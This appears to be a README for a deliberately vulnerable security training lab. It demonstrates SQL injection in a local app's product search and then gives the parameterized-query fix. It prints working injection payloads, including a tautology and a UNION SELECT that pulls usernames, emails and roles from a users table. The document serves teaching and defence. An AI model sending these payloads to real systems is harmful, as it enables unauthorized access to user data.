# Lab 03: SQL injection on product search

Search concatenates the `q` parameter into a Postgres `ILIKE` query, so input becomes SQL structure.

**OWASP Top 10:2025:** [A05 Injection](https://owasp.org/Top10/2025/)

**Code:** `app/routes/shop.py` (`search`) - see `VULN:` / `SAFE:` comments

## Exploit

1. App at http://localhost:8888 after `docker compose up --build`.
2. Open a tautology search:

```text
http://localhost:8888/search?q=%27%20OR%20%271%27%3D%271
```

Decoded `q`:

```text
' OR '1'='1
```

You should see far more products than a normal keyword search.

3. Optional UNION (query selects 8 columns). Decoded `q`:

```text
' UNION SELECT id, username, email, role, 0, '', '', 0 FROM users--
```

Usernames/emails appear as fake product rows.

4. Optional: `q='` alone can dump a verbose SQL error when debug is on (lab 09).

## Fix

Never interpolate user input into SQL. Use bound parameters or the ORM:

```python
pattern = f"%{q}%"
products = g.db.scalars(
    select(Product).where(
        Product.name.ilike(pattern) | Product.description.ilike(pattern)
    )
).all()
```

Read the `SAFE:` comments in `shop.py`.
